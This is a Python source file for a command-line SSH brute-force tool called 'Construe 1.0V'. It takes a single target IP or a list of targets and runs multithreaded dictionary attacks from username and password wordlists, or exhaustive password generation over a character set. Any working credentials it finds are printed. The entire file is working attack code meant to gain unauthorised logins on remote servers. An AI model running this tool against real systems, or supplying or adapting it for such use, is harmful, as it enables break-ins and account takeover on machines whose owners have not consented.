import random
import sys
import string, itertools
from optparse import OptionParser

import Util
from Connection import Connection


class SSHBruteForce():
    def __init__(self):
        self.info = "Construe 1.0V"
        self.targetIp = ""
        self.targetPort = 0
        self.targets = []
        self.usernames = []
        self.passwords = []
        self.connections = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0
        self.timeoutTime = 0
        self.singleMode = False
        self.bruteForceLength = 0
        self.bruteForceSLength = 0
        self.bruteForceMode = False
        #self.characters = string.printable
        self.characters='1279'
        self.user='False'

    def startUp(self):
        usage = '{} [-i targetIp] [-U usernamesFile] [-P passwordsFile]'.format(sys.argv[0])

        optionParser = OptionParser(version=self.info, usage=usage)

        optionParser.add_option('-i', dest='targetIp',
                                help='Ip to attack')
        optionParser.add_option('-p', dest='targetPort',
                                help='Ip port to attack', default=22)
        optionParser.add_option('-d', dest='typeOfAttack',
                                help='Dictionary Attack', default=False)
        optionParser.add_option('-u', dest='username',
                                 help="User to attack", default='False')
        optionParser.add_option('-l', dest='Strictlength',
                                help="Strict length for attacking", default=1)
        optionParser.add_option('-L', dest='lengthLimit',
                                help='Length of bruteforce strings', default=8)
        optionParser.add_option('-I', dest='targetsFile',
                                help='List of IP\'s and ports')
        optionParser.add_option('-U', dest='usernamesFile',
                                help='Username List file')
        optionParser.add_option('-P', dest='passwordsFile',
                                help='Password List file')
        optionParser.add_option('-t', type='int', dest='threads',
                                help='Amount of Threads', default=20)
        optionParser.add_option('-T', type='int', dest='timeout',
                                help='Timeout Time', default=10)
        optionParser.add_option('-S', type='int', dest='characters',
                                help='Characters for the bruteforce attack', default="1279")

        (options, args) = optionParser.parse_args()

        # First a check is used to see if there is at least a singleIp set or a targetList set
        if not options.targetIp and not options.targetsFile:
            optionParser.print_help()
            sys.exit(1)

        else:
            # Check to see if we are running a dictionary attack or a bruteforce
            if bool(options.typeOfAttack) == True:
                #setup the dictionary attack
                #another check to make sure the Username list and passwordlist are filled
                if ((options.usernamesFile or options.username!='False') and options.passwordsFile) :
                    # Then we check if it is a single ip only
                    if options.targetIp and not options.targetsFile:
                        self.singleMode = True
                        self.singleTarget(options)
                    elif not options.targetIp and options.targetsFile:
                        self.multipleTargets(options)
                    else:
                        optionParser.print_help()
                        sys.exit(1)
                else:
                    optionParser.print_help()
                    sys.exit(1)
            else:
                # setup the brtue force
                self.bruteForceMode = True
                # Then we check if it is a single ip only
                if options.targetIp and not options.targetsFile:
                    self.singleMode = True
                    self.singleTarget(options)
                elif not options.targetIp and options.targetsFile:
                    self.multipleTargets(options)
                else:
                    optionParser.print_help()
                    sys.exit(1)

    def singleTarget(self, options):
        self.targetIp = options.targetIp
        self.targetPort = options.targetPort
        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeout
        self.bruteForceLength = options.lengthLimit
        self.bruteForceSLength = options.Strictlength
        self.user=options.username
        self.characters=str(options.characters)

        if bool(options.typeOfAttack):
            if options.username=='False':
                self.usernames = Util.fileContentsToList(options.usernamesFile)
                self.passwords = Util.fileContentsToList(options.passwordsFile)
                self.showStartInfo()
                self.dictionaryAttackSingle()
            else:
                self.passwords=Util.fileContentsToList(options.passwordsFile)
                self.showStartInfo()
                self.dictionaryAttackSingleUser()
        else:
            self.showStartInfo()
            self.bruteForceSingle()

    def multipleTargets(self, options):
        self.targets = Util.fileContentsToTuple(options.targetsFile)
        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeout
        self.bruteForceLength = options.lengthLimit
        self.bruteForceSLength = options.Strictlength
        self.user=options.username

        if bool(options.typeOfAttack):
            if options.username=='False':
                self.usernames = Util.fileContentsToList(options.usernamesFile)
                self.passwords = Util.fileContentsToList(options.passwordsFile)
                self.showStartInfo()
                self.dictionaryAttackMultiple()
            else:
                self.passwords=Util.fileContentsToList(options.passwordsFile)
                self.showStartInfo()
                self.dictinonaryAttackMultipleUser()
        else:
            self.showStartInfo()
            self.bruteForceMultiple()


    def showStartInfo(self):
        print("[*] {} ".format(self.info))
        if self.singleMode:
            print("[*] Brute Forcing {}".format(self.targetIp))
        else:
            print("[*] Loaded {} Targets ".format(str(len(self.targets))))

        if self.bruteForceMode == False:
            if self.user=='False':
                print("[*] Loaded {} Usernames ".format(str(len(self.usernames))))
            print("[*] Loaded {} Passwords ".format(str(len(self.passwords))))
        print("[*] Brute Force Starting ")

    #single Dict attack with username and password file
    def dictionaryAttackSingle(self):
        for username in self.usernames:
            for password in self.passwords:
                print("Trying for {} with password {}".format(username,password))
                self.createConnection(username, password, self.targetIp,
                                      self.targetPort, self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
        self.currentThreadResults()
    #multiple ip attack with username and password file
    def dictionaryAttackMultiple(self):
        for target in self.targets:
            print("Trying for Ip: {} with Port: {}".format(target[0],target[1]))
            for username in self.usernames:
                for password in self.passwords:
                    print("Trying for {} with password {}".format(username,password))
                    self.createConnection(username, password, target[0],
                                          int(target[1]), self.timeoutTime)
                    if self.currentThreadCount == self.amountOfThreads:
                        self.currentThreadResults()
        self.currentThreadResults()
    #single dict attack with user already known
    def dictionaryAttackSingleUser(self):
        for password in self.passwords:
            print("Trying for {} with password {}".format(self.user,password))
            self.createConnection(self.user, password, self.targetIp,
                                          self.targetPort, self.timeoutTime)
            if self.currentThreadCount == self.amountOfThreads:
                self.currentThreadResults()
        self.currentThreadResults()
    #multiple dict attack with user already known
    def dictinonaryAttackMultipleUser(self):
        for target in self.targets:
            print("Trying for Ip: {} with Port: {}".format(target[0],target[1]))
            for password in self.passwords:
                print("Trying for {} with password {}".format(self.user,password))
                self.createConnection(self.user, password, target[0],
                                          int(target[1]), self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
        self.currentThreadResults()
    #for brute force attack -Itertools
    def iter_all_strings(self,l):
        length = l
        while True:
            for s in itertools.product(self.characters, repeat=length):
                yield "".join(s)
            break
    #Core of brute
    def bruteForceExpanded(self,randomUserString,tip,tp):
        randomPasswordString = ""
        for l in range(int(self.bruteForceSLength),int(self.bruteForceLength)+1):
            for s in self.iter_all_strings(l):
                randomPasswordString = s
                print("trying for user: {} with pasword: {}".format(randomUserString,s))
                self.createConnection(randomUserString, randomPasswordString, tip,
                                  tp, self.timeoutTime)
                if self.currentThreadCount == self.amountOfThreads:
                    self.currentThreadResults()
        self.currentThreadResults()
    #single brute
    def bruteForceSingle(self):
        randomUserString = ""
        if(self.user=="False"):
            randomStringLength = random.randint(4, self.bruteForceLength)
            for y in range(randomStringLength):
                randomUserString = randomUserString + random.choice(self.characters)
            self.bruteForceExpanded(randomUserString,self.targetIp,self.targetPort)
        else:
            self.bruteForceExpanded(self.user,self.targetIp,self.targetPort)
    #multiple brute
    def bruteForceMultiple(self):
        for target in self.targets:
            print("Trying for Ip: {} with Port: {}".format(target[0],target[1]))
            randomUserString = ""
            if(self.user=="False"):
                randomStringLength = random.randint(4, self.bruteForceLength)
                for y in range(randomStringLength):
                    randomUserString = randomUserString + random.choice(self.characters)
                self.bruteForceExpanded(randomUserString,target[0],int(target[1]))
            else:
                self.bruteForceExpanded(self.user,target[0],int(target[1]))
        self.currentThreadResults()

    def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
        connection = Connection(username, password, targetIp, targetPort, timeoutTime)
        connection.start()

        self.connections.append(connection)
        self.currentThreadCount += 1

    def currentThreadResults(self):
        for connection in self.connections:
            connection.join()

            if connection.status == 'Succeeded':
                print("[#] TargetIp: {} ".format(connection.targetIp))
                print("[#] Username: {} ".format(connection.username))
                print("[#] Password: {} ".format(connection.password))

                if self.singleMode:
                    self.completed()
            else:
                pass

        self.clearOldThreads()

    def clearOldThreads(self):
        print("Clearing Old Threads")
        self.connections = []
        self.currentThreadCount = 0

    def completed(self):
        print("Completed Brute Force")
        sys.exit(0)


if __name__ == '__main__':
    sshBruteForce = SSHBruteForce()
    sshBruteForce.startUp()
    print("[*] Brute Force Completed")

